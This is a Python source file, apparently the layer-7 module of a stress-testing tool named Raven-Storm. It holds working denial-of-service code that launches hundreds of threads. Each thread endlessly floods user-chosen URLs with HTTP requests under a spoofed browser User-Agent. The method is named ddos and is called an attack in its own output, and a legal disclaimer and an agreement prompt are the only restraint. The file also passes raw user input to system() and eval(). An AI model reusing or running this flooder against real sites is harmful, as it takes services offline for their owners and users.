from CLIF_Framework.framework import event
from CLIF_Framework.framework import tools
from os import system
from time import sleep
from threading import Thread
import urllib.request
event = event()
tools = tools()


class Main:
	def __init__(selfie, console):
		global self
		global var
		self = selfie
		var = console

		self._add_commands()

		# Colors
		var.C_None = "\x1b[0;39m"
		var.C_Bold = "\x1b[1;39m"
		var.C_Green = "\x1b[32m"
		var.C_Violet = "\x1b[34m"
		var.C_Dark_Blue = "\x1b[35m"
		var.C_Red = "\x1b[31m"

		var.target = [""]
		var.threads = 400
		var.sleep = 0
		var.interval = 0

	def _add_commands(self):
		event.commands(self.exit_console, ["exit", "quit", "e", "q"])
		event.commands(self.show_values, ["values", "ls"])
		event.command(self.help)

		event.commands(self.run_shell, ".")
		event.commands(self.debug, "$")

		event.help(["values", "ls"], "Show all options.")

		event.help("target", "Set the target.")
		event.help("targets", "Set multiple targets.")
		event.help("threads", "Amount of threads to use.")
		event.help("sleep", "Delay between threads.")
		event.help("interval", "Delay between each packet send.")
		event.help("run", "Run the stress test.")

	def banner(self):
		system("clear || cls")
		print(("""C_B----------------------------------------------------------C_W
The creators of Raven-Storm are not responsible
for any of your activitys or issues caused by Raven-Storm!
It is strictly illegal to exploit servers
which are not owned by you.
C_B----------------------------------------------------------C_W""").replace("C_W", var.C_None).replace("C_B", var.C_Bold))
		self.help()

	def exit_console(self):
		print("\033[1;32;0mHave a nice day.")
		quit()

	def run_shell(self, command):
		print("")
		system(tools.arg("Enter shell command: \033[1;32;0m", ". ", command))
		print("")

	def debug(self, command):
		print("")
		eval(tools.arg("Enter debug command: \033[1;32;0m", "$ ", command))
		print("")

	@event.command
	def clear():
		system("clear || cls")

	@event.event
	def on_ready():
		self.banner()

	@event.event
	def on_command_not_found(command):
		print("")
		print("The command you entered does not exist.")
		print("")

	@event.event
	def on_interrupt():
		print("")
		var.stop()

	def show_values(self):
		print("")
		print("Targets: %s" % var.target)
		print("Threads: %s" % var.threads)
		print("Delay between threads: %s" % var.sleep)
		print("Delay between packets: %s" % var.interval)
		print("")

	def help(self):
		event.help_title("\x1b[1;39mL7 Help:\x1b[0;39m")
		tools.help("|-- ", " :: ", event)
		print("\033[1;32;0m")

	@event.command
	def targets(command):
		print("")
		var.target = tools.arg("URLS (Seperated by ', '): ", "targets ", command).split(", ")
		print("")

	@event.command
	def target(command):
		print("")
		var.target = [tools.arg("URL: ", "target ", command)]
		print("")

	@event.command
	def threads(command):
		print(" ")
		try:
			var.threads = int(tools.arg("Threads: ", "threads ", command))
		except Exception as e:
			print("There was an error while executing.", e)
		print(" ")

	@event.command
	def sleep(command):
		print(" ")
		try:
			var.sleep = float(tools.arg("Delay between each thread: ", "sleep ", command))
		except Exception as e:
			print("There was an error while executing.", e)
		print(" ")

	@event.command
	def interval(command):
		print(" ")
		try:
			var.interval = float(tools.arg("Delay between each packet: ", "interval ", command))
		except Exception as e:
			print("There was an error while executing.", e)
		print(" ")

	def ddos(self):
		while True:
			for url in var.target:
				response = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)"}))  # noqa: F841
				print("Request send.")
			sleep(var.interval)

	@event.command
	def run():
		if not tools.question("\nDo you agree to not use this tool for illegal purpose?"):
			print("Agreement not accepted.")
			quit()
		else:
			print("")
			print("To stop the attack press: CRTL + Z")
			sleep(3)
			for thread in range(var.threads):
				try:
					t = Thread(target=self.ddos)
					t.start()
					sleep(var.sleep)
				except Exception:
					print("Could not start thread %s." % thread)


def setup(console):
	console.ps1 = "\033[1;32;0mL7> "
	console.add(Main(console), event)
